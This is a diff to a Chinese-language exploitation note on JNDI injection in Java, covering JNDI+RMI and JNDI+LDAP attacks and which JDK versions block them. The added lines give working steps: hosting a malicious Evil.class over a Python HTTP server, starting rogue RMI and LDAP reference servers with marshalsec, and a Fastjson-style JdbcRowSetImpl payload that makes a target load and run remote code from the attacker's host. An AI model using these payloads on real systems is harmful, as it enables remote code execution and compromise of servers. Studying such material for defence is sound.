@@ -1,3 +1,5 @@
+JNDI和java版本关系较大
+比如：在 JDK 8u191 com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false，这会导致无法下载远程类到本地，也就是无法利用。但是还是会有绕过方式，自行测试。
 ![](.topwrite/assets/image_1727319060611.png)
 ## **JNDI+RMI利用方式**
 直接JNDI运行远程方法。
@@ -6,7 +8,7 @@
 在jdk 8U121后不可用了。RMl远程Reference代码默认不信任，RMl远程Reference代码攻击方式开始失效。
 
 **简单案例**
-恶意类，编译.class放在8080http服务
+恶意类，IDEA构建，编译.class放在8080http服务
 ```
 import java.io.IOException;​
 public class Evil {​
@@ -45,9 +47,38 @@ public class Client {​
 
 
 ^
+**RMI服务也可以使用marshalsec启动**
+1、代码写好build，生成Eval.class
+2、我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类Eval.class
+```
+python3  -m http.server 8080
+同目录放Eval.class
+```
+RMI转发到8080
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx:8000/#Eval" 9999
+```
+3、打入
+```
+payload{
+    {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}, 
+        {
+          "@type":"com.sun.rowset.JdbcRowSetImpl",
+           "dataSourceName":"rmi://xxx.xx:9999/EvalCode",
+          "autoCommit":false
+        }
+}
+```
+
+
+^
 ## **JNDI+LDAP利用方式**
 使用marshalsec启动一个恶意的LDAP服务，可以执行恶意方法。
+```
+python3  -m http.server 8000
+```
 其中 http://127.0.0.1:8000/#Evil 的根目录下有一个Evil.class的恶意类。
+使用marshalsec启动一个恶意的LDAP服务10997映射8000的#Evill，
 ```
 java -cp marshalsec-0.0.3-SNAPSH0T-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Evil 10997
 ```
